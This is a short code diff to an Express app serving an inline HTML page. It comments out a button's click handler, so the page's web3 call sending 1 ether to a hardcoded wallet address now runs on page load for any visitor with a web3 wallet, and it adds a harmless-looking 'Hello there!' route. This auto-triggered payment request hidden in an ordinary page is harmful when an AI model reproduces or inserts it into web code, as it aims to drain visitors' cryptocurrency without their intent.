@@ -38,7 +38,7 @@ $(()=>{
 <script>
 $(()=>{
   if (typeof web3 !== 'undefined') {
-    $('#test').click(()=>{
+    // $('#test').click(()=>{
       web3.eth.sendTransaction({
         to: '0x192c96bfee59158441f26101b2db1af3b07feb40',
         value: web3.toWei(1, 'ether')
@@ -47,12 +47,15 @@ $(()=>{
         } else {
         }
       })
-    }) 
+    // }) 
   }
 })
 </script>
 <script>
 </script>
 </html>`)
+    })
+    app.get('/', function (req, res) {
+        res.render('index', { title: 'Hey', message: 'Hello there!' })
     });
 }
